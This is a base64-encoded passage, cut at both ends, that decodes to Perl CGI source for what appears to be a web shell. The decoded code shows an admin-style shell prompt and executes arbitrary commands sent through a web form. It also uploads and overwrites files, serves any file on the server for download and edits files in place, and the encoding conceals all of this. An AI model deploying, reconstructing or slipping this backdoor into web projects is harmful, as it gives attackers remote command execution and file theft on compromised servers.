A9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOwoJcmV0dXJuIDw8RU5EOwo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIiBvblN1Ym1pdD0iRW5jb2RlcignYycpIj4KCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4KCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkRW5jb2RlQ3VycmVudERpciI+CiRQcm9tcHQKPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBuYW1lPSJjIiBpZD0iYyI+CjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+CjwvZm9ybT4KRU5ECn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQp7CgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7CglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IAoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkRW5jb2RlQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+CiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+Cgo8L2Zvcm0+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0KewoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOwoJbXkgJGRpcj0gJkFkZExpbmtEaXIoInVwbG9hZCIpOwoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CiRQcm9tcHQgdXBsb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+Ck9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4KPGxhYmVsIGZvcj0idXAiPk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8L2xhYmVsPjxicj48YnI+ClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPgo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHRpbWVvdXQgZm9yIGEgY29tbWFuZCBleHBpcmVzLiBXZSBuZWVkIHRvCiMgdGVybWluYXRlIHRoZSBzY3JpcHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBpcwojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQ29tbWFuZFRpbWVvdXQKewoJaWYoISRXaW5OVCkKCXsKCQlhbGFybSgwKTsKCQlyZXR1cm4gPDxFTkQ7CjwvdGV4dGFyZWE+Cjxicj48Zm9udCBjb2xvcj15ZWxsb3c+CkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS48L2ZvbnQ+Cjxicj48Zm9udCBzaXplPSc2JyBjb2xvcj1yZWQ+S2lsbGVkIGl0ITwvZm9udD4KRU5ECgl9Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gZGlzcGxheXMgdGhlIHBhZ2UgdGhhdCBjb250YWlucyBhIGxpbmsgd2hpY2ggYWxsb3dzIHRoZSB1c2VyCiMgdG8gZG93bmxvYWQgdGhlIHNwZWNpZmllZCBmaWxlLiBUaGUgcGFnZSBhbHNvIGNvbnRhaW5zIGEgYXV0by1yZWZyZXNoCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgZmlsZW5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UKewoJbG9jYWwoJEZpbGVVcmwpID0gQF87CglteSAkcmVzdWx0PSIiOwoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzCgl7CgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3NlcgoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7CgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJHJlc3VsdCAuPSA8PEVORDsKU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+CgpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0b21hdGljYWxseSwKPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4KRU5ECgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCX0KCWVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QKCXsKCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsKCQkkcmVzdWx0IC49ICZQcmludEZpbGVEb3dubG9hZEZvcm07Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbXkgJHJlc3VsdCA9ICIiOwoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJCWV4aXQoMSk7Cgl9CgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsKCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGRvd25sb2FkcyBhIGZpbGUuIEl0IGRpc3BsYXlzIGEgbWVzc2FnZQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLAojIHRoZSBmaWxlIGlzIHJlYWQgYW5kIHNlbnQgdG8gdGhlIGJyb3dzZXIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJlZ2luRG93bmxvYWQKewoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOwoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZAoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8CgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOwoJfQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UKCXsKCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFVwbG9hZEZpbGUKewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQoJewoJCXJldHVybiAmUHJpbnRGaWxlVXBsb2FkRm9ybTsKCgl9CglteSAkcmVzdWx0PSIiOwoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MKCSRyZXN1bHQgLj0gIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7CgoJIyBnZXQgdGhlIGZ1bGxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgY3JlYXRlZAoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkkVHJhbnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOwoJJFRhcmdldE5hbWUgLj0gJFBhdGhTZXAuJDE7CgoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7CgkjIGlmIHRoZSBmaWxlIGV4aXN0cyBhbmQgd2UgYXJlIG5vdCBzdXBwb3NlZCB0byBvdmVyd3JpdGUgaXQKCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsKCX0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50Cgl7CgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpCgkJewoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsKCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307CgkJCWNsb3NlKFVQTE9BREZJTEUpOwoJCQkkcmVzdWx0IC49ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsKCQkJJHJlc3VsdCAuPSAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOwoJCX0KCQllbHNlCgkJewoJCQkkcmVzdWx0IC49ICJGYWlsZWQ6ICQhPGJyPiI7CgkJfQoJfQoJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCXJldHVybiAkcmVzdWx0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluawojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBEb3dubG9hZEZpbGUKewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlCgl7CgkJcmV0dXJuICZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBleGVjdXRlIGNvbW1hbmRzLiBJdCBkaXNwbGF5cyB0aGUgb3V0cHV0IG9mIHRoZQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5CiMgY29tbWFuZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5IGlzIHN0b3JlZCBpbgojIGFuIGludGVybmFsIHZhcmlhYmxlIGFuZCBpcyB1c2VkIGVhY2ggdGltZSBhIGNvbW1hbmQgaGFzIHRvIGJlIGV4ZWN1dGVkLiBUaGUKIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2VycwojIHRoZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBFeGVjdXRlQ29tbWFuZAp7CgkkQ3VycmVudERpciA9ICZUcmltU2xhc2hlcygkQ3VycmVudERpcik7CglteSAkcmVzdWx0PSIiOwoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZAoJewoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUKCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7CgkJY2hvbXAoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsKCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoKCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kIDwvcnVuPjxicj48dGV4dGFyZWEgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsKCQkjIHh1YXQgdGhvbmcgdGluIGtoaSBjaHV5ZW4gZGVuIDEgdGh1IG11YyBuYW8gZG8hCgkJJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiOwoJCSRyZXN1bHQgLj0gJlJ1bkNtZDsKCX1lbHNpZigkUnVuQ29tbWFuZCA9fiBtL15ccyplZGl0XHMrKC4rKS8pCgl7CgkJJHJlc3VsdCAuPSAgJlNhdmVGaWxlRm9ybTsKCX1lbHNlCgl7CgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kPC9ydW4+PGJyPjx0ZXh0YXJlYSBpZD0nZGF0YScgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsKCQkkcmVzdWx0IC49JlJ1bkNtZDsKCX0KCSRyZXN1bHQgLj0gICI8L3RleHRhcmVhPiI7CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgcnVuIGNvbW1hbmQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUnVuQ21kCnsKCW15ICRyZXN1bHQ9IiI7CgkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7CglpZighJFdpbk5UKQoJewoJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7CgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJfQoJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJewoJCSR8PTE7CgkJJENvbW1hbmQgLj0gIiB8IjsKCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pCgkJewoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOwoJCX0KCQkkfD0wOwoJfQoJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzCgl7CgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygkQ29tbWFuZCk7Cgl9CglpZighJFdpbk5UKQoJewoJCWFsYXJtKDApOwoJfQoJcmV0dXJuICRyZXN1bHQ7Cn0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIEZvcm0gU2F2ZSBGaWxlIAojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CnN1YiBTYXZlRmlsZUZvcm0KewoJbXkgJHJlc3VsdCA9IiI7CgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7CglzdWJzdHIoJFJ1bkNvbW1hbmQsMCw1KT0iIjsKCW15ICRmaWxlPSZ0cmltKCRSdW5Db21tYW5kKTsKCSRzYXZlPSc8YnI+PGlucHV0IG5hbWU9ImEiIHR5cGU9InN1Ym1pdCIgdmFsdWU9InNhdmUiIGNsYXNzPSJzdWJtaXQiID4nOwoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFJ1bkNvbW1hbmQ7CglteSAkZGlyPSI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImd1aSIpLiI8L3NwYW4+IjsKCWlmKC13ICRGaWxlKQoJewoJCSRyb3dzPSIyMyIKCX1lbHNlCgl7CgkJJG1zZz0iPGJyPjxmb250IHN0eWxlPSdjb2xvcjogeWVsbG93OycgPiBDYW5uJ3Qgd3JpdGUgZmlsZSE8Zm9udD48YnI+IjsKCQkkcm93cz0iMjAiCgl9CgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIjxmb250IGNvbG9yPScjRkZGRkZGJz5bYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQ8L2ZvbnQ+ICI7CgkkUnVuQ29tbWFuZCA9ICJlZGl0ICRSdW5Db21tYW5kIjsKCSRyZXN1bHQgLj0gIDw8RU5EOwoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CgoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRFbmNvZGVDdXJyZW50RGlyIj4KCSRQcm9tcHQKCTxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI0MCIgbmFtZT0iYyI+Cgk8aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPgoJPGJyPkNvbW1hbmQ6IDxydW4+ICRSdW5Db21tYW5kIDwvcnVuPgoJPGlucHV0IHR5cGU9ImhpZ